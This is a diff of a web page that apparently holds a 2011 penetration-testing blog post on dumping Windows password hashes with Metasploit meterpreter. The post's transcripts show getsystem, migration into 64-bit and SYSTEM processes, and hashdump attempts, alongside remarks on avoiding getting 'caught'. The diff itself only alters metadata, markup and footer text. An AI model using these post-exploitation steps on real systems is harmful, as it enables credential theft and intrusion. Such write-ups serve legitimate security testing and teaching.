@@ -32,8 +32,8 @@
 
 
 <meta itemprop="name" content="Dumping Hashes on Win2k8 R2 x64 with Metasploit">
-<meta itemprop="description" content="When trying to dump password hashes on a Windows 2008 R2 64 bit box I constantly run into the &ldquo;The parameter is incorrect&rdquo; error in meterpreter. So I&rsquo;ve had to fall back on dropping binaries which I really don&rsquo;t like doing because of the added clean up and chance of getting &lsquo;caught&rsquo;. Well, with a bit of migration you&rsquo;ll be back to passing the hash. Here is how, with a bit of the thought process first:"><meta itemprop="datePublished" content="2011-05-16T02:35:31&#43;00:00" />
-<meta itemprop="dateModified" content="2011-05-16T02:35:31&#43;00:00" />
+<meta itemprop="description" content="When trying to dump password hashes on a Windows 2008 R2 64 bit box I constantly run into the &ldquo;The parameter is incorrect&rdquo; error in meterpreter. So I&rsquo;ve had to fall back on dropping binaries which I really don&rsquo;t like doing because of the added clean up and chance of getting &lsquo;caught&rsquo;. Well, with a bit of migration you&rsquo;ll be back to passing the hash. Here is how, with a bit of the thought process first:"><meta itemprop="datePublished" content="2011-05-16T02:35:31+00:00" />
+<meta itemprop="dateModified" content="2011-05-16T02:35:31+00:00" />
 <meta itemprop="wordCount" content="1005">
 <meta itemprop="keywords" content="" />
 <meta name="twitter:card" content="summary"/>
@@ -54,7 +54,7 @@
 
 
 
-    <meta property="article:published_time" content="2011-05-16 02:35:31 &#43;0000 &#43;0000" />
+    <meta property="article:published_time" content="2011-05-16 02:35:31 &#43;0000 UTC" />
 
 
 
@@ -129,7 +129,7 @@
 
             <div class="post-content">
                 <p>When trying to dump password hashes on a Windows 2008 R2 64 bit box I constantly run into the &ldquo;The parameter is incorrect&rdquo; error in meterpreter. So I&rsquo;ve had to fall back on dropping binaries which I really don&rsquo;t like doing because of the added clean up and chance of getting &lsquo;caught&rsquo;. Well, with a bit of migration you&rsquo;ll be back to passing the hash. Here is how, with a bit of the thought process first:</p>
-<pre><code>                ##                          ###           ##    ##
+<pre tabindex="0"><code>                ##                          ###           ##    ##
  ##  ##  #### ###### ####  #####   #####    ##    ####        ######
 ####### ##  ##  ##  ##         ## ##  ##    ##   ##  ##   ###   ##
 ####### ######  ##  #####   ####  ##  ##    ##   ##  ##   ##    ##
@@ -223,7 +223,7 @@ Current pid: 2992
 meterpreter &gt; hashdump
 [-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
 </code></pre><p>Ah, the wonderful &lsquo;The parameter is incorrect&rsquo; error. Ok we are an admin since we can see the user for SYSTEM processes, so that isn&rsquo;t the issue, but lets do a &lsquo;getprivs&rsquo; just in case:</p>
-<pre><code>meterpreter &gt; getprivs    
+<pre tabindex="0"><code>meterpreter &gt; getprivs    
 ============================================================
 Enabled Process Privileges
 ============================================================
@@ -251,24 +251,24 @@ Enabled Process Privileges
 meterpreter &gt; hashdump
 [-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
 </code></pre><p>Boo.. Ok, so maybe we have to be &lsquo;SYSTEM&rsquo;&hellip;</p>
-<pre><code>meterpreter &gt; getsystem
+<pre tabindex="0"><code>meterpreter &gt; getsystem
 ...got system (via technique 1).
 
 meterpreter &gt; hashdump
 [-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
 </code></pre><p>Still nothing&hellip; Maybe it requires that we be in a 64 bit process&hellip; PID 1720 was 64 bit version of Notepad, lets try that&hellip;</p>
-<pre><code>meterpreter &gt; migrate 1720
+<pre tabindex="0"><code>meterpreter &gt; migrate 1720
 [*] Migrating to 1720...
 [*] Migration completed successfully.
 
 meterpreter &gt; hashdump
 [-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
 </code></pre><p>Damn, what about as &lsquo;SYSTEM&rsquo;&hellip;</p>
-<pre><code>meterpreter &gt; getsystem ...got system (via technique 1).  
+<pre tabindex="0"><code>meterpreter &gt; getsystem ...got system (via technique 1).  
 meterpreter &gt; hashdump 
 [-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
 </code></pre><p>No joy.. hmmm What about a &lsquo;SYSTEM&rsquo; process that was already there.. &lsquo;dns.exe&rsquo; PID 1288 should be good&hellip;</p>
-<pre><code>meterpreter &gt; migrate 1288
+<pre tabindex="0"><code>meterpreter &gt; migrate 1288
 [*] Migrating to 1288...
 [*] Migration completed successfully.
 
@@ -313,7 +313,7 @@ meterpreter &gt;
                 <footer class="footer">
     <div class="footer__inner">
         <div class="footer__content">
-            <span>&copy; 2021</span>
+            <span>&copy; 2023</span>
             
             <span><a href="https://malicious.link/post/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
         </div>
@@ -321,7 +321,7 @@ meterpreter &gt;
     <div class="footer__inner">
         <div class="footer__content">
             <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
-            <span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/mubix">mubix</a> - Theme by <a href="https://github.com/rhazdon/">Djordje Atlialp</a></span>
           </div>
     </div>
 </footer>
@@ -334,7 +334,7 @@ meterpreter &gt;
 
 
 
-<script type="text/javascript" src="/bundle.min.a0f363fdf81cdc5cfacc447a79c33189eb000d090336cd04aac8ee256f423b3133b836c281944c19c75e38d0b0b449f01ce5807e37798b7ac94ac1db51983fc4.js" integrity="sha512-oPNj/fgc3Fz6zER6ecMxiesADQkDNs0EqsjuJW9COzEzuDbCgZRMGcdeONCwtEnwHOWAfjd5i3rJSsHbUZg/xA=="></script>
+<script type="text/javascript" src="/bundle.min.8cc3758efe48ef82e2eb9a5f317b44c0805353a43762207be6fe8ffb05815cce7a19d37f6bf387c378a3bdfc3029981668d645374a33db4ee3480e15a4bfdc7c.js" integrity="sha512-jMN1jv5I74Li65pfMXtEwIBTU6Q3YiB75v6P&#43;wWBXM56GdN/a/OHw3ijvfwwKZgWaNZFN0oz207jSA4VpL/cfA=="></script>
 
 
 
